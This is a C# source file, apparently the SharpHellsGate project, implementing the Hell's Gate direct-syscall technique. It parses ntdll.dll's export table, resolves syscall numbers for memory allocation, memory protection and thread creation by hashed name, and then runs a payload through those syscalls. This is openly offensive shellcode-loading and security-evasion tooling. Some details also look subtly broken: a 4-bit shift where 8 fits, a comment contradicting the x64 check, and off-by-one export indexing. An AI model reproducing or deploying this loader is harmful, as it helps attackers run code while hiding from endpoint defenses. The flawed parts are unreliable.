using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

namespace SharpHellsGate {

    [StructLayout(LayoutKind.Sequential, Pack = 0)]
    public struct VxTableEntry {
        public ulong Hash;
        public byte Low;
        public byte High;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 0)]
    public struct VxTable {
        public VxTableEntry NtAllocateVirtualMemory;
        public VxTableEntry NtProtectVirtualMemory;
        public VxTableEntry NtCreateThreadEx;
        public VxTableEntry NtWaitForSingleObject;
    }

    public class Program {

        public static short IMAGE_DOS_SIGNATURE { get; } = 0x5a00 | 0x4D;        // MZ
        public static int IMAGE_NT_SIGNATURE { get; } = 0x00004500 | 0x00000050; // PE00

        static void Main(string[] args) {
            LogInfo("Copyright (C) 2020 Paul Laine (@am0nsec)");
            LogInfo("C# Implementation of the Hell's Gate VX Technique");
            Console.WriteLine("   --------------------------------------------------\n");

            // Only tested on x86
            if (IntPtr.Size != 8) {
                LogError("Project only tested in x64 context.\n");
                return;
            }

            // Get module
            if (!File.Exists(Environment.SystemDirectory + "\\ntdll.dll")) {
                LogError("Unable to find NTDLL module.\n");
                return;
            }
            byte[] bModuleBlob = File.ReadAllBytes(Environment.SystemDirectory + "\\ntdll.dll");
            MemoryUtil MemUtil = new MemoryUtil(bModuleBlob);

            // Get DOS HEADER
            Win32.IMAGE_DOS_HEADER ImageDOSHeader = MemUtil.GetStructureFromBlob<Win32.IMAGE_DOS_HEADER>(0);
            if (ImageDOSHeader.Equals(default(Win32.IMAGE_DOS_HEADER)) || ImageDOSHeader.e_magic != IMAGE_DOS_SIGNATURE) {
                LogError("Invalid DOS Header.");
                return;
            }

            // Get NT Headers
            Win32.IMAGE_NT_HEADERS64 ImageNTHeaders = MemUtil.GetStructureFromBlob<Win32.IMAGE_NT_HEADERS64>(ImageDOSHeader.e_lfanew);
            if (ImageNTHeaders.Equals(default(Win32.IMAGE_NT_HEADERS64)) || ImageNTHeaders.Signature != IMAGE_NT_SIGNATURE) {
                LogError("Invalid NT Headers.");
                return;
            }

            // Sections
            Win32.IMAGE_SECTION_HEADER ImageSection = new Win32.IMAGE_SECTION_HEADER();
            List<Win32.IMAGE_SECTION_HEADER> ImageSectionHeaders = new List<Win32.IMAGE_SECTION_HEADER>(ImageNTHeaders.FileHeader.NumberOfSections);
            for (int cx = 0; cx < ImageNTHeaders.FileHeader.NumberOfSections; cx++) {
                long iSectionOffset = GetSectionOffset(ImageDOSHeader.e_lfanew, ImageNTHeaders.FileHeader.SizeOfOptionalHeader, cx);

                ImageSection = MemUtil.GetStructureFromBlob<Win32.IMAGE_SECTION_HEADER>(iSectionOffset);
                if (!ImageSection.Equals(default(Win32.IMAGE_SECTION_HEADER))) {
                    ImageSectionHeaders.Add(ImageSection);
                }
            }

            // Get the section in which the EAT RVA points
            int ivaImageExportTable = ImageNTHeaders.OptionalHeader.DataDirectory[0].VirtualAddress;
            long OffsetImageExportDirectory = ConvertRvaToOffset(ivaImageExportTable, ImageSectionHeaders);

            Win32.IMAGE_EXPORT_DIRECTORY ImageExportDirectory = MemUtil.GetStructureFromBlob<Win32.IMAGE_EXPORT_DIRECTORY>(OffsetImageExportDirectory);
            if (ImageExportDirectory.Equals(default(Win32.IMAGE_EXPORT_DIRECTORY))) {
                LogError("Invalid EAT.");
                return;
            }

            // Parse all functions
            long PtrToFunctionNames = ConvertRvaToOffset(ImageExportDirectory.AddressOfNames, ImageSectionHeaders);
            long PtrToFunctions = ConvertRvaToOffset(ImageExportDirectory.AddressOfFunctions, ImageSectionHeaders);

            // Load the table
            VxTable Table = new VxTable();
            Table.NtAllocateVirtualMemory.Hash = 0xf5bd373480a6b89b;
            GetVxTableEntry(ref MemUtil, ref Table.NtAllocateVirtualMemory, ref ImageSectionHeaders, PtrToFunctions, PtrToFunctionNames, ImageExportDirectory.NumberOfNames);
            LogInfo($"NtAllocateVirtualMemory: 0x{HighLowToSystemCall(Table.NtAllocateVirtualMemory):x4}");

            Table.NtCreateThreadEx.Hash = 0x64dc7db288c5015f;
            GetVxTableEntry(ref MemUtil, ref Table.NtCreateThreadEx, ref ImageSectionHeaders, PtrToFunctions, PtrToFunctionNames, ImageExportDirectory.NumberOfNames);
            LogInfo($"NtCreateThreadEx:        0x{HighLowToSystemCall(Table.NtCreateThreadEx):x4}");

            Table.NtProtectVirtualMemory.Hash = 0x858bcb1046fb6a37;
            GetVxTableEntry(ref MemUtil, ref Table.NtProtectVirtualMemory, ref ImageSectionHeaders, PtrToFunctions, PtrToFunctionNames, ImageExportDirectory.NumberOfNames);
            LogInfo($"NtProtectVirtualMemory:  0x{HighLowToSystemCall(Table.NtProtectVirtualMemory):x4}");

            Table.NtWaitForSingleObject.Hash = 0xc6a2fa174e551bcb;
            GetVxTableEntry(ref MemUtil, ref Table.NtWaitForSingleObject, ref ImageSectionHeaders, PtrToFunctions, PtrToFunctionNames, ImageExportDirectory.NumberOfNames);
            LogInfo($"NtWaitForSingleObject:   0x{HighLowToSystemCall(Table.NtWaitForSingleObject):x4}\n");

            // Execute payload
            HellsGate gate = new HellsGate(Table);
            gate.Payload();
        }

        public static void LogInfo(string msg, int indent = 0, string prefix = "[>]") {
#if DEBUG
            if (string.IsNullOrEmpty(msg))
                return;

            LogMessage(msg, prefix, indent, ConsoleColor.Blue);
#endif
        }

        public static void LogError(string msg, int indent = 0, string prefix = "[-]") {
#if DEBUG
            if (string.IsNullOrEmpty(msg))
                return;

            LogMessage(msg, prefix, indent, ConsoleColor.Red);
#endif
        }

        public static void LogSuccess(string msg, int indent = 0, string prefix = "[+]") {
#if DEBUG
            if (string.IsNullOrEmpty(msg))
                return;

            LogMessage(msg, prefix, indent, ConsoleColor.Green);
#endif
        }

        public static void GetVxTableEntry(ref MemoryUtil MemUtil, ref VxTableEntry Entry, ref List<Win32.IMAGE_SECTION_HEADER> Sections, long PtrFunctions, long PtrNames, int NumberOfNames) {
            for (int cx = 0; cx < NumberOfNames; cx++) {
                uint PtrFunctionName = MemUtil.ReadPtr32(PtrNames + (sizeof(uint) * cx));
                string FunctionName = MemUtil.ReadAscii(ConvertRvaToOffset(PtrFunctionName, Sections));

                if (Entry.Hash == Getdjb2Hash(FunctionName)) {
                    uint PtrFunctionAdddress = MemUtil.ReadPtr32(PtrFunctions + (sizeof(uint) * (cx + 1)));
                    long OffsetFunctionAddress = ConvertRvaToOffset(PtrFunctionAdddress, Sections);

                    byte[] opcode = MemUtil.GetFunctionOpCode(OffsetFunctionAddress);
                    if (opcode[3] == 0xb8 && opcode[18] == 0x0f && opcode[19] == 0x05) {
                        Entry.High = opcode[5];
                        Entry.Low = opcode[4];
                        return;
                    }
                }
            }
        }

        public static long ConvertRvaToOffset(long rva, Win32.IMAGE_SECTION_HEADER SectionHeader)
            => rva - SectionHeader.VirtualAddress + SectionHeader.PointerToRawData;

        public static long ConvertRvaToOffset(long rva, List<Win32.IMAGE_SECTION_HEADER> SectionHeaders)
            => ConvertRvaToOffset(rva, GetSectionByRVA(SectionHeaders, rva));

        public static Win32.IMAGE_SECTION_HEADER GetSectionByRVA(List<Win32.IMAGE_SECTION_HEADER> SectionHeaders, long rva)
            => SectionHeaders.Where(x => rva > x.VirtualAddress && rva <= x.VirtualAddress + x.SizeOfRawData).First();

        public static Win32.IMAGE_SECTION_HEADER GetSectionByName(List<Win32.IMAGE_SECTION_HEADER> SectionHeaders, string SectionName)
            => SectionHeaders.Where(x => x.Name.Equals(SectionName)).First();

        public static long GetSectionOffset(int e_lfanew, int SizeOfOptionalHeader, int cx)
            => e_lfanew
            + Marshal.SizeOf<Win32.IMAGE_FILE_HEADER>()
            + SizeOfOptionalHeader
            + 4
            + (Marshal.SizeOf<Win32.IMAGE_SECTION_HEADER>() * cx);

        public static short HighLowToSystemCall(VxTableEntry Entry) => (short)((Entry.High << 4) | Entry.Low);

        public static ulong Getdjb2Hash(string FunctionName) {
            if (string.IsNullOrEmpty(FunctionName))
                return 0;

            ulong hash = 0x7734773477347734;
            foreach (char c in FunctionName)
                hash = ((hash << 0x5) + hash) + (byte)c;

            return hash;
        }

        private static void LogMessage(string msg, string prefix, int indent, ConsoleColor color) {
            // Indent
            Console.Write(new String(' ', indent));

            // Color and prefix
            Console.ForegroundColor = color;
            Console.Write(prefix);
            Console.ResetColor();

            // Message
            Console.WriteLine($" {msg}");
        }
    }
}
